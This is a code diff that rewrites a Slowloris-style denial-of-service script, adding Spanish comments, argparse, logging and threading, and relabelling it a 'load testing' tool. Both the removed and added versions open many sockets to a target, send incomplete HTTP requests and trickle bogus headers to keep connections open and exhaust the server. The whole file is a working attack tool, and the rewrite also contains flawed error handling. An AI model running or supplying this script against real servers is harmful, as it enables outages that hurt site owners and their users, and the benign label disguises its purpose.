@@ -1,65 +1,73 @@
-#!/usr/bin/env python
-
-import sys
-import random
+import logging
+import argparse
+import threading
 import socket
+import random
 import time
-from progress.bar import Bar
 
-regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",                    "Accept-language: en-US,en,q=0.5"]
+# Configuración del registro para monitorear la actividad del script
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def init_socket(ip,port):
+# Headers HTTP comunes a enviar en las solicitudes
+regular_headers = [
+    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Accept-language: en-US,en,q=0.5"
+]
+
+def init_socket(ip, port):
+    """
+    Inicializa una conexión socket y envía un request GET con headers.
+    Gestiona excepciones para manejar errores de red y conexiones fallidas.
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
-    s.connect((ip,int(port)))
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
-
-    for header in regular_headers:
-        s.send('{}\r\n'.format(header).encode('UTF-8'))
-
+    try:
+        s.connect((ip, int(port)))
+        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
+        for header in regular_headers:
+            s.send('{}\r\n'.format(header).encode('UTF-8'))
+        logging.info("Socket inicializado con éxito")
+    except socket.error as e:
+        logging.error(f"Error al establecer socket: {e}")
     return s
 
-def main():
-    if len(sys.argv)<5:
-        print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
-        return
-
-    ip = sys.argv[1]
-    port = sys.argv[2]
-    socket_count= int(sys.argv[3])
-    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
-    timer = int(sys.argv[4])
-    socket_list=[]
-
-    for _ in range(int(socket_count)):
-        try:
-            s=init_socket(ip,port)
-        except socket.error:
-            break
-        socket_list.append(s)
-        bar.next()
-
-    bar.finish()
-
+def send_keep_alive(sockets, timer, rate_limit):
+    """
+    Envía headers de Keep-Alive a todos los sockets activos.
+    Implementa limitación de tasa de solicitudes por segundo.
+    """
+    request_interval = 1 / rate_limit if rate_limit > 0 else 0
     while True:
-        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
-
-        for s in socket_list:
+        logging.info(f"Enviando Keep-Alive Headers a {len(sockets)} sockets")
+        for s in sockets:
             try:
-                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+                time.sleep(request_interval)  # Limitar la tasa de solicitudes
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
             except socket.error:
-                socket_list.remove(s)
-
-        for _ in range(socket_count - len(socket_list)):
-            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
-            try:
-                s=init_socket(ip,port)
-                if s:
-                    socket_list.append(s)
-            except socket.error:
-                break
-
+                sockets.remove(s)
         time.sleep(timer)
 
-if __name__=="__main__":
-    main()
+def main(args):
+    """
+    Función principal que maneja la creación de sockets y el envío de Keep-Alive.
+    Utiliza argumentos de línea de comandos para configuración personalizada.
+    """
+    sockets = []
+    for _ in range(args.socket_count):
+        s = init_socket(args.ip, args.port)
+        if s:
+            sockets.append(s)
+
+    # Iniciar el envío de Keep-Alive en un hilo separado
+    threading.Thread(target=send_keep_alive, args=(sockets, args.timer, args.rate_limit)).start()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Script de Pruebas de Carga")
+    parser.add_argument("ip", type=str, help="Dirección IP del servidor")
+    parser.add_argument("port", type=int, help="Puerto del servidor")
+    parser.add_argument("socket_count", type=int, help="Cantidad de sockets a crear")
+    parser.add_argument("timer", type=int, help="Intervalo de tiempo entre envíos de Keep-Alive")
+    parser.add_argument("--rate_limit", type=float, default=0, help="Limitación de tasa de solicitudes por segundo (0 para sin límite)")
+
+    args = parser.parse_args()
+    main(args)
